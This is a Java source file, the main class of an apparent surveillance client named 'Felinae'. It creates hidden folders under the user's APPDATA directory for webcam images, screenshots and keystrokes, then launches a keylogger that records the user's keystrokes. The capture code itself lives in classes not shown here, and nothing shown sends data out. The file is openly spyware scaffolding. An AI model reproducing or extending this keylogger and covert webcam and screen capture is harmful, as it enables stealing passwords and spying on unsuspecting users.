package felinae;

import java.util.ArrayList;

import felinae.capture_keystrokes.CaptureKeystrokes;
import felinae.folder_manager.FolderManager;
import felinae.os_utils.OSValidator;

public class FelinaeClient {
    public static int limitOfKeystrokes = 10;
    public static String environmentVariableName = "APPDATA";
    public static String pathToTargetDataFolder;
    public static String targetDataFolderName = "\\felinae";
    public static String webcamImageFolderName = "\\webcam_images";
    public static String screenImageFolderName = "\\screen_images";
    public static String keystrokesFolderName = "\\keystrokes";
    
    public static void main(String args[]) {

        runFelinaeClient();

    }

    private static void runFelinaeClient() {

        OSValidator osValidator = new OSValidator();

        if (osValidator.allowedOS()) {
            
            pathToTargetDataFolder = System.getenv(environmentVariableName);
            
            FolderManager folderManager = new FolderManager(pathToTargetDataFolder,
                                                            targetDataFolderName, 
                                                            webcamImageFolderName, 
                                                            screenImageFolderName,
                                                            keystrokesFolderName);
            
            folderManager.createTargetDataFolders();
            
            CaptureKeystrokes keylogger = new CaptureKeystrokes(limitOfKeystrokes);
            keylogger.captureUserKeystrokes();
        }
        else {
            closeApplication();    
        }
            
    }
    
    private static void closeApplication() {
        System.exit(0);
    }

    
    
    
}
